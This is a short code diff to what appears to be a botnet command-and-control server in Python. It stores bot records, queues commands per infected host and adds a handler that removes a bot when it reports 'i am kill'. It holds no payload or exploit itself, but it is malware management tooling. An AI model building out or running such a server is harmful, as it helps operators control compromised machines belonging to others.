@@ -46,7 +46,7 @@ def handle_client(sock, addr):
     inp = select([sock], [], [], 1)
     if inp[0]:
         action(sock.recv(2048), b)
-    if len(queue[addr[0]]) != 0:
+    if queue[addr[0]] and len(queue[addr[0]]) != 0:
         sock.send(queue[addr[0]].pop())
     sock.close()
 
@@ -55,6 +55,11 @@ def action(data, bot):
         bot.os = data.split(":")[1]
     elif data.startswith("set sleep:"):
         bot.sleep_interval = int(data.split(":")[1])
+    elif data == "i am kill":
+        db.session.delete(bot)
+        db.session.commit()
+        del queue[bot.ip]
+        return
     else:
         bot.last_response = data
     db.session.add(bot)
